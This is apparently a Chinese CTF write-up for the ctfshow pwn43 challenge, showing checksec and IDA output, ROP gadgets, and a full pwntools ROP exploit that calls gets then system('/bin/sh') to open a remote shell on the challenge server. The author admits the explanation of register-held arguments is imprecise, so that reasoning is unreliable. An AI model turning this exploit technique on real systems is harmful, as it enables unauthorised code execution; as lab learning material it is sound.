```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn43
```

```
tasike@tasike-VM:~/Desktop$ file pwn43
pwn43: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=235861daf6a3307cbe3e097d1329e001a84c7b83, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn43
[*] '/home/tasike/Desktop/pwn43'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  logo();
  ctfshow();
  return 0;
}
```

跟进`ctfshow`

```c
char *ctfshow()
{
  char s[104]; // [esp+Ch] [ebp-6Ch] BYREF

  return gets(s);
}
```

> `s`与`ebp`距离`0x6C`

有`_system`函数

```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

没有`/bin/sh`字符串

但是可以注意`bss段`有一个`buf2`

```
.bss:0804B060                               public buf2
.bss:0804B060 ??                            buf2 db    ? ;
.bss:0804B061 ??                            db    ? ;
.bss:0804B062 ??                            db    ? ;
.bss:0804B063 ??                            db    ? ;
.bss:0804B064 ??                            db    ? ;
```

> 我们向程序中`bss段`的`buf2`处写入`/bin/sh`字符串，并将其地址作为`system`的参数传入

payload的大致：
```python
payload = [填充] + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + [4bytes填充] +p32(buf2)
#1.填充后溢出，执行gets函数，接收数据
#2.将数据从栈中弹出存入寄存器ebx中
#3.再用缓冲区指针buf2指向寄存器ebx的数据
#4.调用system函数，参数为buf2所指数据，即gets接收的数据
```

查看`pop|ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn43 --only "pop|ret"
Gadgets information
============================================================
0x0804884b : pop ebp ; ret
0x08048848 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048409 : pop ebx ; ret
0x0804884a : pop edi ; pop ebp ; ret
0x08048849 : pop esi ; pop edi ; pop ebp ; ret
0x080483f2 : ret
0x0804856e : ret 0xeac1

Unique gadgets found: 7
```

> 用第4行和第6行都行，因为都是对于一个参数的，具体为什么这里用寄存器来，请见文章最后



编写`attack43.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28262)
gets = 0x08048420
popebx = 0x08048409  # popebp = 0x0804884b
buf2 = 0x0804B060
system = 0x08048450
payload = cyclic(0x6C + 0x4) + p32(gets) + p32(popebx) + p32(buf2) + p32(system) + p32(0) + p32(buf2)
r.sendline(payload)
r.sendline("/bin/sh")
r.interactive()
```

> 在32位中，参数和返回值直接就存在栈中，但对于payload中有多个函数时，如果不是最后一个函数，则需要将其参数用寄存器来保存【目前我试过的寄存器都可以，只要参数个数和控制到的寄存器一致就行】【8月13日补充，尽管上述想法能让我们正确做出题目，但关于参数的说法还是不太妥当，首先32位中参数是保存在栈上的，而非寄存器上。其次这个理论也不能解释其他的能打通的payload，如下面pwn43这个也能打通：cyclic(0x6c + 4) + p32(gets) + p32(system) + p32(buf2) + p32(buf2)，这个则可以通过填充返回值来理解，也确实合理】【但我做题还是会用32位寄存器的思想，直到我有一天题目没打通，那么我会再次回来修改文章】







